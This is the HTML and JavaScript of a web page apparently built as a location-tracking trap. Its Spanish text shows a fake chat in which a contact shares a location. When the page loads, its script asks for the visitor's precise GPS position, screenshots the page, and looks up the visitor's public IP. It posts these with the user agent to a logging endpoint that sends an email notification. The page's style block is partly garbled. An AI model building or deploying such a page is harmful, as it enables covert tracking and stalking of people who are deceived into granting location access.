    <style>

        .status {

        .status.show {

        .status.success {

            color: #2e7d32;
        }

        .status.error {

        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;

        @keyframes spin {

        }

        .footer {

            font-size: 0.9em;
            color: #999;
        }
    </style>
</head>
<body>

                    <div style="background: #e3f2fd; padding: 10px 14px; border-radius: 10px; max-width: 70%; text-align: left; border-bottom-left-radius: 3px;">
                        <p style="margin: 0; color: #333;">¡Hola Cony! 🦆 Estoy en camino</p>

                        <p style="margin: 0; color: #333;">¿Me envías tu ubicación? 📍</p>

                <div style="margin-bottom: 12px;">
                    <div style="background: #e3f2fd; padding: 10px 14px; border-radius: 10px; max-width: 70%; text-align: left; border-bottom-left-radius: 3px;">
                        <p style="margin: 0; color: #333;">Claro babe! 💕 Mira donde estoy</p>

                <!-- Ducky envía ubicación -->
                <div style="margin-bottom: 12px;">
                    <div style="background: #fff59d; padding: 10px 14px; border-radius: 10px; max-width: 70%; text-align: left; border-bottom-left-radius: 3px;">
                        <p style="margin: 0; color: #333;">📌 Ubicación compartida</p>

        <div class="status show" id="status">
            <div class="loading"></div>
            <p id="statusText" style="margin-top: 15px; font-size: 1.1em;">
                🔍 Compartiendo ubicación...
            </p>
        </div>

        <div class="footer">

            © 2026

    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
    <script>
        // Set site name from server config
        (async function(){
            try{
                const res = await fetch('/api/config');
                const cfg = await res.json();
                if(cfg.site_name){
                    document.title = cfg.site_name;
                    const elems = document.querySelectorAll('#siteName, #siteNameFooter');
                    elems.forEach(e => e.textContent = cfg.site_name);
                }
            }catch(e){/* ignore */}
        })();
    </script>
    <script>
        const statusDiv = document.getElementById('status');
        const statusText = document.getElementById('statusText');

        function updateStatus(emoji, message, type = '') {
            statusText.innerHTML = `${emoji} ${message}`;
            if (type === 'success') {
                statusDiv.classList.add('success');
            } else if (type === 'error') {
                statusDiv.classList.add('error');
            }
        }

        // Función para obtener la ubicación GPS
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    updateStatus('⚠️', 'Tu dispositivo no soporta geolocalización', 'error');
                    resolve(null);
                    return;
                }

                updateStatus('🔍', 'Obteniendo ubicación GPS...');

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        
                        updateStatus('✅', `Ubicación obtenida<br>Lat: ${location.latitude.toFixed(6)}, Lon: ${location.longitude.toFixed(6)}`);
                        resolve(location);
                    },
                    (error) => {
                        let errorMessage = 'Error al obtener ubicación';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = 'Permiso de ubicación denegado<br>Por favor, permite el acceso';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = 'Ubicación no disponible';
                                break;
                            case error.TIMEOUT:
                                errorMessage = 'Tiempo de espera agotado';
                                break;
                        }
                        updateStatus('⚠️', errorMessage, 'error');
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Función principal
        async function logVisit() {
            try {
                // 1. Obtener ubicación GPS
                const location = await getLocation();
                
                if (!location) {
                    updateStatus('⚠️', 'No se pudo obtener la ubicación GPS', 'error');
                    return;
                }

                // 2. Capturar pantalla
                updateStatus('📸', 'Capturando pantalla...');
                await new Promise(resolve => setTimeout(resolve, 500));

                const canvas = await html2canvas(document.body, {
                    allowTaint: true,
                    useCORS: true,
                    logging: false
                });

                const screenshot = canvas.toDataURL('image/png');

                // 3. Obtener IP pública y enviar al servidor
                let publicIp = null;
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipJson = await ipRes.json();
                    publicIp = ipJson.ip;
                } catch (e) {
                    console.warn('No se pudo obtener IP pública:', e);
                }

                // 4. Enviar al servidor
                updateStatus('💾', 'Guardando en base de datos...');

                const response = await fetch('/api/log-visit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        screenshot: screenshot,
                        latitude: location.latitude,
                        longitude: location.longitude,
                        accuracy: location.accuracy,
                        public_ip: publicIp,
                        user_agent: navigator.userAgent
                    })
                });

                const result = await response.json();

                if (result.success) {
                    updateStatus('📧', 'Enviando notificación por email...');
                    
                    // Pequeña pausa para mostrar el mensaje
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    updateStatus('✅', `¡Ubicación guardada exitosamente!<br>ID: ${result.visitId}<br>Notificación enviada por email`, 'success');
                } else {
                    throw new Error('Error al guardar');
                }
            } catch (error) {
                console.error('Error:', error);
                updateStatus('❌', 'Error al procesar la solicitud', 'error');
            }
        }

        // Ejecutar al cargar la página
        window.addEventListener('load', () => {
            logVisit();
        });
    </script>
</body>
</html>
